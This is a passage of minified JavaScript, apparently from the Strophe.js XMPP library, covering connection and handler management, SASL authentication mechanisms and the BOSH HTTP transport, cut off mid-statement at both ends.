"+this.handler+"("+this.name+","+this.id+","+this.ns+")}"}},r.TimedHandler=function(e,t){this.period=e,this.handler=t,this.lastCalled=(new Date).getTime(),this.user=!0},r.TimedHandler.prototype={run:function(){return this.lastCalled=(new Date).getTime(),this.handler()},reset:function(){this.lastCalled=(new Date).getTime()},toString:function(){return"{TimedHandler: "+this.handler+"("+this.period+")}"}},r.Connection=function(e,t){for(var i in this.service=e,this.options=t||{},t=this.options.protocol||"",0===e.indexOf("ws:")||0===e.indexOf("wss:")||0===t.indexOf("ws")?this._proto=new r.Websocket(this):this._proto=new r.Bosh(this),this.jid="",this.features=this.domain=null,this._sasl_data={},this.do_bind=this.do_session=!1,this.timedHandlers=[],this.handlers=[],this.removeTimeds=[],this.removeHandlers=[],this.addTimeds=[],this.addHandlers=[],this.protocolErrorHandlers={HTTP:{},websocket:{}},this._disconnectTimeout=this._idleTimeout=null,this.disconnecting=this.connected=this.authenticated=!1,this.do_authentication=!0,this.restored=this.paused=!1,this._data=[],this._uniqueId=0,this._sasl_challenge_handler=this._sasl_failure_handler=this._sasl_success_handler=null,this.maxRetries=5,this._idleTimeout=setTimeout(function(){this._onIdle()}.bind(this),100),n.addCookies(this.options.cookies),this.registerSASLMechanisms(this.options.mechanisms),r._connectionPlugins)r._connectionPlugins.hasOwnProperty(i)&&((e=function(){}).prototype=r._connectionPlugins[i],this[i]=new e,this[i].init(this))},r.Connection.prototype={reset:function(){this._proto._reset(),this.do_bind=this.do_session=!1,this.timedHandlers=[],this.handlers=[],this.removeTimeds=[],this.removeHandlers=[],this.addTimeds=[],this.addHandlers=[],this.restored=this.disconnecting=this.connected=this.authenticated=!1,this._data=[],this._requests=[],this._uniqueId=0},pause:function(){this.paused=!0},resume:function(){this.paused=!1},getUniqueId:function(e){var t="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){var t=16*Math.random()|0;return("x"==e?t:3&t|8).toString(16)}));return"string"==typeof e||"number"==typeof e?t+":"+e:t+""},addProtocolErrorHandler:function(e,t,i){this.protocolErrorHandlers[e][t]=i},connect:function(e,t,i,n,s,o,a){this.jid=e,this.authzid=r.getBareJidFromJid(this.jid),this.authcid=a||r.getNodeFromJid(this.jid),this.pass=t,this.servtype="xmpp",this.connect_callback=i,this.restored=this.authenticated=this.connected=this.disconnecting=!1,this.domain=r.getDomainFromJid(this.jid),this._changeConnectStatus(r.Status.CONNECTING,null),this._proto._connect(n,s,o)},attach:function(e,t,i,n,s,o,a){if(!(this._proto instanceof r.Bosh))throw{name:"StropheSessionError",message:'The "attach" method can only be used with a BOSH connection.'};this._proto._attach(e,t,i,n,s,o,a)},restore:function(e,t,i,n,s){if(!this._sessionCachingSupported())throw{name:"StropheSessionError",message:'The "restore" method can only be used with a BOSH connection.'};this._proto._restore(e,t,i,n,s)},_sessionCachingSupported:function(){if(this._proto instanceof r.Bosh){if(!JSON)return!1;try{window.sessionStorage.setItem("_strophe_","_strophe_"),window.sessionStorage.removeItem("_strophe_")}catch(e){return!1}return!0}return!1},xmlInput:function(e){},xmlOutput:function(e){},rawInput:function(e){},rawOutput:function(e){},nextValidRid:function(e){},send:function(e){if(null!==e){if("function"==typeof e.sort)for(var t=0;t<e.length;t++)this._queueData(e[t]);else"function"==typeof e.tree?this._queueData(e.tree()):this._queueData(e);this._proto._send()}},flush:function(){clearTimeout(this._idleTimeout),this._onIdle()},sendPresence:function(e,t,i,n){var s=null,o=this;"function"==typeof e.tree&&(e=e.tree());var a=e.getAttribute("id");if(a||(a=this.getUniqueId("sendPresence"),e.setAttribute("id",a)),"function"==typeof t||"function"==typeof i){var r=this.addHandler((function(e){s&&o.deleteTimedHandler(s),"error"==e.getAttribute("type")?i&&i(e):t&&t(e)}),null,"presence",null,a);n&&(s=this.addTimedHandler(n,(function(){return o.deleteHandler(r),i&&i(null),!1})))}return this.send(e),a},sendIQ:function(e,t,i,n){var s=null,o=this;"function"==typeof e.tree&&(e=e.tree());var a=e.getAttribute("id");if(a||(a=this.getUniqueId("sendIQ"),e.setAttribute("id",a)),"function"==typeof t||"function"==typeof i){var r=this.addHandler((function(e){s&&o.deleteTimedHandler(s);var n=e.getAttribute("type");if("result"==n)t&&t(e);else{if("error"!=n)throw{name:"StropheError",message:"Got bad IQ type of "+n};i&&i(e)}}),null,"iq",["error","result"],a);n&&(s=this.addTimedHandler(n,(function(){return o.deleteHandler(r),i&&i(null),!1})))}return this.send(e),a},_queueData:function(e){if(null===e||!e.tagName||!e.childNodes)throw{name:"StropheError",message:"Cannot queue non-DOMElement."};this._data.push(e)},_sendRestart:function(){this._data.push("restart"),this._proto._sendRestart(),this._idleTimeout=setTimeout(function(){this._onIdle()}.bind(this),100)},addTimedHandler:function(e,t){return e=new r.TimedHandler(e,t),this.addTimeds.push(e),e},deleteTimedHandler:function(e){this.removeTimeds.push(e)},addHandler:function(e,t,i,n,s,o,a){return e=new r.Handler(e,t,i,n,s,o,a),this.addHandlers.push(e),e},deleteHandler:function(e){this.removeHandlers.push(e),0<=(e=this.addHandlers.indexOf(e))&&this.addHandlers.splice(e,1)},registerSASLMechanisms:function(e){this.mechanisms={},(e=e||[r.SASLAnonymous,r.SASLExternal,r.SASLMD5,r.SASLOAuthBearer,r.SASLPlain,r.SASLSHA1]).forEach(this.registerSASLMechanism.bind(this))},registerSASLMechanism:function(e){this.mechanisms[e.prototype.name]=e},disconnect:function(e){this._changeConnectStatus(r.Status.DISCONNECTING,e),r.info("Disconnect was called because: "+e),this.connected?(e=!1,this.disconnecting=!0,this.authenticated&&(e=a({xmlns:r.NS.CLIENT,type:"unavailable"})),this._disconnectTimeout=this._addSysTimedHandler(3e3,this._onDisconnectTimeout.bind(this)),this._proto._disconnect(e)):(r.info("Disconnect was called before Strophe connected to the server"),this._proto._abortAllRequests(),this._doDisconnect())},_changeConnectStatus:function(e,t){for(var i in this._status=e,r._connectionPlugins)if(r._connectionPlugins.hasOwnProperty(i)){var n=this[i];if(n.statusChanged)try{n.statusChanged(e,t)}catch(e){r.error(i+" plugin caused an exception changing status: "+e)}}if(this.connect_callback)try{this.connect_callback(e,t)}catch(e){r._handleError(e),r.error("User connection callback caused an exception: "+e)}},_doDisconnect:function(e){"number"==typeof this._idleTimeout&&clearTimeout(this._idleTimeout),null!==this._disconnectTimeout&&(this.deleteTimedHandler(this._disconnectTimeout),this._disconnectTimeout=null),r.info("_doDisconnect was called"),this._proto._doDisconnect(),this.restored=this.disconnecting=this.authenticated=!1,this.handlers=[],this.timedHandlers=[],this.removeTimeds=[],this.removeHandlers=[],this.addTimeds=[],this.addHandlers=[],this._changeConnectStatus(r.Status.DISCONNECTED,e),this.connected=!1},_dataRecv:function(e,t){if(r.info("_dataRecv called"),null!==(e=this._proto._reqToData(e))){for(this.xmlInput!==r.Connection.prototype.xmlInput&&(e.nodeName===this._proto.strip&&e.childNodes.length?this.xmlInput(e.childNodes[0]):this.xmlInput(e)),this.rawInput!==r.Connection.prototype.rawInput&&(t?this.rawInput(t):this.rawInput(r.serialize(e)));0<this.removeHandlers.length;)t=this.removeHandlers.pop(),0<=(t=this.handlers.indexOf(t))&&this.handlers.splice(t,1);for(;0<this.addHandlers.length;)this.handlers.push(this.addHandlers.pop());if(this.disconnecting&&this._proto._emptyQueue())this._doDisconnect();else if(null!==(t=e.getAttribute("type"))&&"terminate"==t)this.disconnecting||(t=e.getAttribute("condition"),e=e.getElementsByTagName("conflict"),null!==t?("remote-stream-error"==t&&0<e.length&&(t="conflict"),this._changeConnectStatus(r.Status.CONNFAIL,t)):this._changeConnectStatus(r.Status.CONNFAIL,"unknown"),this._doDisconnect(t));else{var i=this;r.forEachChild(e,null,(function(e){var t,n=i.handlers;for(i.handlers=[],t=0;t<n.length;t++){var s=n[t];try{(!s.isMatch(e)||!i.authenticated&&s.user||s.run(e))&&i.handlers.push(s)}catch(e){r.warn("Removing Strophe handlers due to uncaught exception: "+e.message)}}}))}}},mechanisms:{},_connect_cb:function(e,t,i){r.info("_connect_cb was called"),this.connected=!0;try{var n=this._proto._reqToData(e)}catch(e){if("badformat"!=e)throw e;this._changeConnectStatus(r.Status.CONNFAIL,"bad-format"),this._doDisconnect("bad-format")}if(n&&(this.xmlInput!==r.Connection.prototype.xmlInput&&(n.nodeName===this._proto.strip&&n.childNodes.length?this.xmlInput(n.childNodes[0]):this.xmlInput(n)),this.rawInput!==r.Connection.prototype.rawInput&&(i?this.rawInput(i):this.rawInput(r.serialize(n))),this._proto._connect_cb(n)!==r.Status.CONNFAIL))if(n.getElementsByTagNameNS?0<n.getElementsByTagNameNS(r.NS.STREAM,"features").length:0<n.getElementsByTagName("stream:features").length||0<n.getElementsByTagName("features").length){e=[];var s=n.getElementsByTagName("mechanism");if(0<s.length)for(i=0;i<s.length;i++){var o=r.getText(s[i]);this.mechanisms[o]&&e.push(this.mechanisms[o])}0===e.length&&0===n.getElementsByTagName("auth").length?this._proto._no_auth_received(t):!1!==this.do_authentication&&this.authenticate(e)}else this._proto._no_auth_received(t)},sortMechanismsByPriority:function(e){var t,i;for(t=0;t<e.length-1;++t){var n=t;for(i=t+1;i<e.length;++i)e[i].prototype.priority>e[n].prototype.priority&&(n=i);n!=t&&(i=e[t],e[t]=e[n],e[n]=i)}return e},_attemptSASLAuth:function(e){e=this.sortMechanismsByPriority(e||[]);var i,n=!1;for(i=0;i<e.length;++i)if(e[i].prototype.test(this)){this._sasl_success_handler=this._addSysHandler(this._sasl_success_cb.bind(this),null,"success",null,null),this._sasl_failure_handler=this._addSysHandler(this._sasl_failure_cb.bind(this),null,"failure",null,null),this._sasl_challenge_handler=this._addSysHandler(this._sasl_challenge_cb.bind(this),null,"challenge",null,null),this._sasl_mechanism=new e[i],this._sasl_mechanism.onStart(this),e=s("auth",{xmlns:r.NS.SASL,mechanism:this._sasl_mechanism.name}),this._sasl_mechanism.isClientFirst&&(i=this._sasl_mechanism.onChallenge(this,null),e.t(t.encode(i))),this.send(e.tree()),n=!0;break}return n},_attemptLegacyAuth:function(){null===r.getNodeFromJid(this.jid)?(this._changeConnectStatus(r.Status.CONNFAIL,"x-strophe-bad-non-anon-jid"),this.disconnect("x-strophe-bad-non-anon-jid")):(this._changeConnectStatus(r.Status.AUTHENTICATING,null),this._addSysHandler(this._auth1_cb.bind(this),null,null,null,"_auth_1"),this.send(o({type:"get",to:this.domain,id:"_auth_1"}).c("query",{xmlns:r.NS.AUTH}).c("username",{}).t(r.getNodeFromJid(this.jid)).tree()))},authenticate:function(e){this._attemptSASLAuth(e)||this._attemptLegacyAuth()},_sasl_challenge_cb:function(e){e=t.decode(r.getText(e)),e=this._sasl_mechanism.onChallenge(this,e);var i=s("response",{xmlns:r.NS.SASL});return""!==e&&i.t(t.encode(e)),this.send(i.tree()),!0},_auth1_cb:function(e){return e=o({type:"set",id:"_auth_2"}).c("query",{xmlns:r.NS.AUTH}).c("username",{}).t(r.getNodeFromJid(this.jid)).up().c("password").t(this.pass),r.getResourceFromJid(this.jid)||(this.jid=r.getBareJidFromJid(this.jid)+"/strophe"),e.up().c("resource",{}).t(r.getResourceFromJid(this.jid)),this._addSysHandler(this._auth2_cb.bind(this),null,null,null,"_auth_2"),this.send(e.tree()),!1},_sasl_success_cb:function(e){var i;if(this._sasl_data["server-signature"]&&("v"==(e=t.decode(r.getText(e)).match(/([a-z]+)=([^,]+)(,|$)/))[1]&&(i=e[2]),i!=this._sasl_data["server-signature"]))return this.deleteHandler(this._sasl_failure_handler),this._sasl_failure_handler=null,this._sasl_challenge_handler&&(this.deleteHandler(this._sasl_challenge_handler),this._sasl_challenge_handler=null),this._sasl_data={},this._sasl_failure_cb(null);r.info("SASL authentication succeeded."),this._sasl_mechanism&&this._sasl_mechanism.onSuccess(),this.deleteHandler(this._sasl_failure_handler),this._sasl_failure_handler=null,this._sasl_challenge_handler&&(this.deleteHandler(this._sasl_challenge_handler),this._sasl_challenge_handler=null);var n=[],s=function(e,t){for(;e.length;)this.deleteHandler(e.pop());return this._sasl_auth1_cb.bind(this)(t),!1};return n.push(this._addSysHandler(function(e){s.bind(this)(n,e)}.bind(this),null,"stream:features",null,null)),n.push(this._addSysHandler(function(e){s.bind(this)(n,e)}.bind(this),r.NS.STREAM,"features",null,null)),this._sendRestart(),!1},_sasl_auth1_cb:function(e){var t;for(this.features=e,t=0;t<e.childNodes.length;t++){var i=e.childNodes[t];"bind"==i.nodeName&&(this.do_bind=!0),"session"==i.nodeName&&(this.do_session=!0)}return this.do_bind?(this._addSysHandler(this._sasl_bind_cb.bind(this),null,null,null,"_bind_auth_2"),(e=r.getResourceFromJid(this.jid))?this.send(o({type:"set",id:"_bind_auth_2"}).c("bind",{xmlns:r.NS.BIND}).c("resource",{}).t(e).tree()):this.send(o({type:"set",id:"_bind_auth_2"}).c("bind",{xmlns:r.NS.BIND}).tree())):this._changeConnectStatus(r.Status.AUTHFAIL,null),!1},_sasl_bind_cb:function(e){var t;return"error"==e.getAttribute("type")?(r.info("SASL binding failed."),0<e.getElementsByTagName("conflict").length&&(t="conflict"),this._changeConnectStatus(r.Status.AUTHFAIL,t),!1):0<(e=e.getElementsByTagName("bind")).length?void(0<(e=e[0].getElementsByTagName("jid")).length&&(this.jid=r.getText(e[0]),this.do_session?(this._addSysHandler(this._sasl_session_cb.bind(this),null,null,null,"_session_auth_2"),this.send(o({type:"set",id:"_session_auth_2"}).c("session",{xmlns:r.NS.SESSION}).tree())):(this.authenticated=!0,this._changeConnectStatus(r.Status.CONNECTED,null)))):(r.info("SASL binding failed."),this._changeConnectStatus(r.Status.AUTHFAIL,null),!1)},_sasl_session_cb:function(e){return"result"==e.getAttribute("type")?(this.authenticated=!0,this._changeConnectStatus(r.Status.CONNECTED,null)):"error"==e.getAttribute("type")&&(r.info("Session creation failed."),this._changeConnectStatus(r.Status.AUTHFAIL,null)),!1},_sasl_failure_cb:function(e){return this._sasl_success_handler&&(this.deleteHandler(this._sasl_success_handler),this._sasl_success_handler=null),this._sasl_challenge_handler&&(this.deleteHandler(this._sasl_challenge_handler),this._sasl_challenge_handler=null),this._sasl_mechanism&&this._sasl_mechanism.onFailure(),this._changeConnectStatus(r.Status.AUTHFAIL,null),!1},_auth2_cb:function(e){return"result"==e.getAttribute("type")?(this.authenticated=!0,this._changeConnectStatus(r.Status.CONNECTED,null)):"error"==e.getAttribute("type")&&(this._changeConnectStatus(r.Status.AUTHFAIL,null),this.disconnect("authentication failed")),!1},_addSysTimedHandler:function(e,t){return(e=new r.TimedHandler(e,t)).user=!1,this.addTimeds.push(e),e},_addSysHandler:function(e,t,i,n,s){return(e=new r.Handler(e,t,i,n,s)).user=!1,this.addHandlers.push(e),e},_onDisconnectTimeout:function(){return r.info("_onDisconnectTimeout was called"),this._changeConnectStatus(r.Status.CONNTIMEOUT,null),this._proto._onDisconnectTimeout(),this._doDisconnect(),!1},_onIdle:function(){for(var e,t,i;0<this.addTimeds.length;)this.timedHandlers.push(this.addTimeds.pop());for(;0<this.removeTimeds.length;)t=this.removeTimeds.pop(),0<=(e=this.timedHandlers.indexOf(t))&&this.timedHandlers.splice(e,1);var n=(new Date).getTime();for(i=[],e=0;e<this.timedHandlers.length;e++)t=this.timedHandlers[e],(this.authenticated||!t.user)&&(0>=t.lastCalled+t.period-n?t.run()&&i.push(t):i.push(t));this.timedHandlers=i,clearTimeout(this._idleTimeout),this._proto._onIdle(),this.connected&&(this._idleTimeout=setTimeout(function(){this._onIdle()}.bind(this),100))}},r.SASLMechanism=function(e,t,i){this.name=e,this.isClientFirst=t,this.priority=i},r.SASLMechanism.prototype={test:function(e){return!0},onStart:function(e){this._connection=e},onChallenge:function(e,t){throw Error("You should implement challenge handling!")},onFailure:function(){this._connection=null},onSuccess:function(){this._connection=null}},r.SASLAnonymous=function(){},r.SASLAnonymous.prototype=new r.SASLMechanism("ANONYMOUS",!1,20),r.SASLAnonymous.prototype.test=function(e){return null===e.authcid},r.SASLPlain=function(){},r.SASLPlain.prototype=new r.SASLMechanism("PLAIN",!0,30),r.SASLPlain.prototype.test=function(e){return null!==e.authcid},r.SASLPlain.prototype.onChallenge=function(e){var t=e.authzid;return t=(t=t+"\0"+e.authcid)+"\0"+e.pass,n.utf16to8(t)},r.SASLSHA1=function(){},r.SASLSHA1.prototype=new r.SASLMechanism("SCRAM-SHA-1",!0,50),r.SASLSHA1.prototype.test=function(e){return null!==e.authcid},r.SASLSHA1.prototype.onChallenge=function(s,o,a){return o=a||i.hexdigest(1234567890*Math.random()),a=(a="n="+n.utf16to8(s.authcid))+",r="+o,s._sasl_data.cnonce=o,s._sasl_data["client-first-message-bare"]=a,a="n,,"+a,this.onChallenge=function(i,s){var o,a="c=biws,",r=i._sasl_data["client-first-message-bare"]+","+s+",",c=i._sasl_data.cnonce;for(o=/([a-z]+)=([^,]+)(,|$)/;s.match(o);){var h=s.match(o);switch(s=s.replace(h[0],""),h[1]){case"r":var d=h[2];break;case"s":var u=h[2];break;case"i":var l=h[2]}}if(d.substr(0,c.length)!==c)return i._sasl_data={},i._sasl_failure_cb();for(r+=a+="r="+d,u=t.decode(u),u+="\0\0\0",d=n.utf16to8(i.pass),u=s=e.core_hmac_sha1(d,u),c=1;c<l;c++){for(o=e.core_hmac_sha1(d,e.binb2str(s)),s=0;5>s;s++)u[s]^=o[s];s=o}for(u=e.binb2str(u),l=e.core_hmac_sha1(u,"Client Key"),s=e.str_hmac_sha1(u,"Server Key"),u=e.core_hmac_sha1(e.str_sha1(e.binb2str(l)),r),i._sasl_data["server-signature"]=e.b64_hmac_sha1(s,r),s=0;5>s;s++)l[s]^=u[s];return a+",p="+t.encode(e.binb2str(l))}.bind(this),a},r.SASLMD5=function(){},r.SASLMD5.prototype=new r.SASLMechanism("DIGEST-MD5",!1,40),r.SASLMD5.prototype.test=function(e){return null!==e.authcid},r.SASLMD5.prototype._quote=function(e){return'"'+e.replace(/\\/g,"\\\\").replace(/"/g,'\\"')+'"'},r.SASLMD5.prototype.onChallenge=function(e,t,s){var o=/([a-z]+)=("[^"]+"|[^,"]+)(?:,|$)/;s=s||i.hexdigest(""+1234567890*Math.random());for(var a,r="",c=null,h="";t.match(o);)switch(a=t.match(o),t=t.replace(a[0],""),a[2]=a[2].replace(/^"(.+)"$/,"$1"),a[1]){case"realm":r=a[2];break;case"nonce":h=a[2];break;case"host":c=a[2]}return t=e.servtype+"/"+e.domain,null!==c&&(t=t+"/"+c),o=n.utf16to8(e.authcid+":"+r+":"+this._connection.pass),o=i.hash(o)+":"+h+":"+s,c="AUTHENTICATE:"+t,e="charset=utf-8,username="+this._quote(n.utf16to8(e.authcid))+",",e+="realm="+this._quote(r)+",",e=(e+="nonce="+this._quote(h)+",")+"nc=00000001,cnonce="+this._quote(s)+",",e+="digest-uri="+this._quote(t)+",",e+="response="+i.hexdigest(i.hexdigest(o)+":"+h+":00000001:"+s+":auth:"+i.hexdigest(c))+",",this.onChallenge=function(){return""},e+"qop=auth"},r.SASLOAuthBearer=function(){},r.SASLOAuthBearer.prototype=new r.SASLMechanism("OAUTHBEARER",!0,60),r.SASLOAuthBearer.prototype.test=function(e){return null!==e.authcid},r.SASLOAuthBearer.prototype.onChallenge=function(e){var t="n,a="+e.authzid;return t=t+",auth=Bearer "+e.pass,n.utf16to8(t+"")},r.SASLExternal=function(){},r.SASLExternal.prototype=new r.SASLMechanism("EXTERNAL",!0,10),r.SASLExternal.prototype.onChallenge=function(e){return e.authcid===e.authzid?"":e.authzid},{Strophe:r,$build:s,$msg:function(e){return new r.Builder("message",e)},$iq:o,$pres:a,SHA1:e,Base64:t,MD5:i}})),function(e,t){if("function"!=typeof define||!define.amd)return t(Strophe,$build);define("strophe-bosh",["strophe-core"],(function(e){return t(e.Strophe,e.$build)}))}(0,(function(e,t){return e.Request=function(t,i,n,s){this.id=++e._requestId,this.xmlData=t,this.data=e.serialize(t),this.func=this.origFunc=i,this.rid=n,this.date=NaN,this.sends=s||0,this.abort=!1,this.dead=null,this.age=function(){return this.date?(new Date-this.date)/1e3:0},this.timeDead=function(){return this.dead?(new Date-this.dead)/1e3:0},this.xhr=this._newXHR()},e.Request.prototype={getResponse:function(){var t=null;if(this.xhr.responseXML&&this.xhr.responseXML.documentElement){if("parsererror"==(t=this.xhr.responseXML.documentElement).tagName)throw e.error("invalid response received"),e.error("responseText: "+this.xhr.responseText),e.error("responseXML: "+e.serialize(this.xhr.responseXML)),"parsererror"}else if(this.xhr.responseText)throw e.error("invalid response received"),e.error("responseText: "+this.xhr.responseText),"badformat";return t},_newXHR:function(){var e=null;return window.XMLHttpRequest?(e=new XMLHttpRequest).overrideMimeType&&e.overrideMimeType("text/xml; charset=utf-8"):window.ActiveXObject&&(e=new ActiveXObject("Microsoft.XMLHTTP")),e.onreadystatechange=this.func.bind(null,this),e}},e.Bosh=function(e){this._conn=e,this.rid=Math.floor(4294967295*Math.random()),this.sid=null,this.hold=1,this.wait=60,this.window=5,this.errors=0,this.inactivity=null,this._requests=[]},e.Bosh.prototype={strip:null,_buildBody:function(){var i=t("body",{rid:this.rid++,xmlns:e.NS.HTTPBIND});return null!==this.sid&&i.attrs({sid:this.sid}),this._conn.options.keepalive&&this._conn._sessionCachingSupported()&&this._cacheSession(),i},_reset:function(){this.rid=Math.floor(4294967295*Math.random()),this.sid=null,this.errors=0,this._conn._sessionCachingSupported()&&window.sessionStorage.removeItem("strophe-bosh-session"),this._conn.nextValidRid(this.rid)},_connect:function(t,i,n){this.wait=t||this.wait,this.hold=i||this.hold,this.errors=0,t=this._buildBody().attrs({to:this._conn.domain,"xml:lang":"en",wait:this.wait,hold:this.hold,content:"text/xml; charset=utf-8",ver:"1.6","xmpp:version":"1.0","xmlns:xmpp":e.NS.BOSH}),n&&t.attrs({route:n}),n=this._conn._connect_cb,this._requests.push(new e.Request(t.tree(),this._onRequestStateChange.bind(this,n.bind(this._conn)),t.tree().getAttribute("rid"))),this._throttledRequestHandler()},_attach:function(t,i,n,s,o,a,r){this._conn.jid=t,this.sid=i,this.rid=n,this._conn.connect_callback=s,this._conn.domain=e.getDomainFromJid(this._conn.jid),this._conn.authenticated=!0,this._conn.connected=!0,this.wait=o||this.wait,this.hold=a||this.hold,this.window=r||this.window,this._conn._changeConnectStatus(e.Status.ATTACHED,null)},_restore:function(t,i,n,s,o){var a=JSON.parse(window.sessionStorage.getItem("strophe-bosh-session"));if(!(null!=a&&a.rid&&a.sid&&a.jid&&(null==t||e.getBareJidFromJid(a.jid)==e.getBareJidFromJid(t)||null===e.getNodeFromJid(t)&&e.getDomainFromJid(a.jid)==t)))throw{name:"StropheSessionError",message:"_restore: no restoreable session."};this._conn.restored=!0,this._attach(a.jid,a.sid,a.rid,i,n,s,o)},_cacheSession:function(){this._conn.authenticated?this._conn.jid&&this.rid&&this.sid&&window.sessionStorage.setItem("strophe-bosh-session",JSON.stringify({jid:this._conn.jid,rid:this.rid,sid:this.sid})):window.sessionStorage.removeItem("strophe-bosh-session")},_connect_cb:function(t){var i=t.getAttribute("type");if(null!==i&&"terminate"==i)return i=t.getAttribute("condition"),e.error("BOSH-Connection failed: "+i),t=t.getElementsByTagName("conflict"),null!==i?("remote-stream-error"==i&&0<t.length&&(i="conflict"),this._conn._changeConnectStatus(e.Status.CONNFAIL,i)):this._conn._changeConnectStatus(e.Status.CONNFAIL,"unknown"),this._conn._doDisconnect(i),e.Status.CONNFAIL;this.sid||(this.sid=t.getAttribute("sid")),(i=t.getAttribute("requests"))&&(this.window=parseInt(i,10)),(i=t.getAttribute("hold"))&&(this.hold=parseInt(i,10)),(i=t.getAttribute("wait"))&&(this.wait=parseInt(i,10)),(t=t.getAttribute("inactivity"))&&(this.inactivity=parseInt(t,10))},_disconnect:function(e){this._sendTerminate(e)},_doDisconnect:function(){this.sid=null,this.rid=Math.floor(4294967295*Math.random()),this._conn._sessionCachingSupported()&&window.sessionStorage.removeItem("strophe-bosh-session"),this._conn.nextValidRid(this.rid)},_emptyQueue:function(){return 0===this._requests.length},_callProtocolErrorHandlers:function(e){var t;e=this._getRequestStatus(e),(t=this._conn.protocolErrorHandlers.HTTP[e])&&t.call(this,e)},_hitError:function(t){this.errors++,e.warn("request errored, status: "+t+", number of errors: "+this.errors),4<this.errors&&this._conn._onDisconnectTimeout()},_no_auth_received:function(t){t=t?t.bind(this._conn):this._conn._connect_cb.bind(this._conn);var i=this._buildBody();this._requests.push(new e.Request(i.tree(),this._onRequestStateChange.bind(this,t.bind(this._conn)),i.tree().getAttribute("rid"))),this._throttledRequestHandler()},_onDisconnectTimeout:function(){this._abortAllRequests()},_abortAllRequests:function(){for(var e;0<this._requests.length;)(e=this._requests.pop()).abort=!0,e.xhr.abort(),e.xhr.onreadystatechange=function(){}},_onIdle:function(){var t=this._conn._data;if(this._conn.authenticated&&0===this._requests.length&&0===t.length&&!this._conn.disconnecting&&(e.info("no requests during idle cycle, sending blank request"),t.push(null)),!this._conn.paused){if(2>this._requests.length&&0<t.length){for(var i=this._buildBody(),n=0;n<t.length;n++)null!==t[n]&&("restart"===t[n]?i.attrs({to:this._conn.domain,"xml:lang":"en","xmpp:restart":"true","xmlns:xmpp":e.NS.BOSH}):i.cnode(t[n]).up());delete this._conn._data,this._conn._data=[],this._requests.push(new e.Request(i.tree(),this._onRequestStateChange.bind(this,this._conn._dataRecv.bind(this._conn)),i.tree().getAttribute("rid"))),this._throttledRequestHandler()}0<this._requests.length&&(t=this._requests[0].age(),null!==this._requests[0].dead&&this._requests[0].timeDead()>Math.floor(e.SECONDARY_TIMEOUT*this.wait)&&this._throttledRequestHandler(),t>Math.floor(e.TIMEOUT*this.wait)&&(e.warn("Request "+this._requests[0].id+" timed out, over "+Math.floor(e.TIMEOUT*this.wait)+" seconds since last activity"),this._throttledRequestHandler()))}},_getRequestStatus:function(t,i){if(4==t.xhr.readyState)try{var n=t.xhr.status}catch(t){e.error("Caught an error while retrieving a request's status, reqStatus: "+n)}return void 0===n&&(n="number"==typeof i?i:0),n},_onRequestStateChange:function(t,i){if(e.debug("request id "+i.id+"."+i.sends+" state changed to "+i.xhr.readyState),i.abort)i.abort=!1;else if(4===i.xhr.readyState){var n=this._getRequestStatus(i);if(this.disconnecting&&400<=n)this._hitError(n),this._callProtocolErrorHandlers(i);else{if((0<n&&500>n||5<i.sends)&&(this._removeRequest(i),e.debug("request id "+i.id+" should now be removed")),200==n){var s=this._requests[0]==i;(this._requests[1]==i||s&&0<this._requests.length&&this._requests[0].age()>Math.floor(e.SECONDARY_TIMEOUT*this.wait))&&this._restartRequest(0),this._conn.nextValidRid(Number(i.rid)+1),e.debug("request id "+i.id+"."+i.sends+" got 200"),t(i),this.errors=0}else 0===n||400<=n&&600>n||12e3<=n?(e.error("request id "+i.id+"."+i.sends+" error "+n+" happened"),this._hitError(n),this._callProtocolErrorHandlers(i),400<=n&&500>n&&(this._conn._changeConnectStatus(e.Status.DISCONNECTING,null),this._conn._doDisconnect())):e.error("request id "+i.id+"."+i.sends+" error "+n+" happened");0<n&&500>n&&!(5<i.sends)||this._throttledRequestHandler()}}},_processRequest:function(t){var i=this,n=this._requests[t],s=this._getRequestStatus(n,-1);if(n.sends>this._conn.maxRetries)this._conn._onDisconnectTimeout();else{var o=n.age();o=!isNaN(o)&&o>Math.floor(e.TIMEOUT*this.wait);var a=null!==n.dead&&n.timeDead()>Math.floor(e.SECONDARY_TIMEOUT*this.wait);if(s=4==n.xhr.readyState&&(1>s||500<=s),(o||a||s)&&(a&&e.error("Request "+this._requests[t].id+" timed out (secondary), restarting"),n.abort=!0,n.xhr.abort(),n.xhr.onreadystatechange=function(){},this._requests[t]=new e.Request(n.xmlData,n.origFunc,n.rid,n.sends),n=this._requests[t]),0===n.xhr.readyState){e.debug("request id "+n.id+"."+n.sends+" posting");try{var r=this._conn.options.contentType||"text/xml; charset=utf-8";n.xhr.open("POST",this._conn.service,!this._conn.options.sync),void 0!==n.xhr.setRequestHeader&&n.xhr.setRequestHeader("Content-Type",r),this._conn.options.withCredentials&&(n.xhr.withCredentials=!0)}catch(t){return e.error("XHR open failed."),this._conn.connected||this._conn._changeConnectStatus(e.Status.CONNFAIL,"bad-service"),void this._conn.disconnect()}var c=function(){if(n.date=new Date,i._conn.options.customHeaders){var e,t=i._conn.options.customHeaders;for(e in t)t.hasOwnProperty(e)&&n.xhr.setRequestHeader(e,t[e])}n.xhr.send(n.data)};1<n.sends?setTimeout((function(){c()}),1e3*Math.min(Math.floor(e.TIMEOUT*this.wait),Math.pow(n.sends,3))):c(),n.sends++,this._conn.xmlOutput!==e.Connection.prototype.xmlOutput&&(n.xmlData.nodeName===this.strip&&n.xmlData.childNodes.length?this._conn.xmlOutput(n.xmlData.childNodes[0]):this._conn.xmlOutput(n.xmlData)),this._conn.rawOutput!==e.Connection.prototype.rawOutput&&this._conn.rawOutput(n.data)}else e.debug("_processRequest: "+(0===t?"first":"second")+" request has readyState of "+n.xhr.readyState)}},_removeRequest:function(t){var i;for(e.debug("removing request"),i=this._requests.length-1;0<=i;i--)t==this._requests[i]&&this._requests.splice(i,1);t.xhr.onreadystatechange=function(){},this._throttledRequestHandler()},_restartRequest:function(e){var t=this._requests[e];null===t.dead&&(t.dead=new Date),this._processRequest(e)},_reqToData:function(e){try{return e.getResponse()}catch(e){if("parsererror"!=e)throw e;this._conn.disconnect("strophe-parsererror")}},_sendTerminate:function(t){e.info("_sendTerminate was called");var i=this._buildBody().attrs({type:"terminate"});t&&i.cnode(t.tree()),t=new 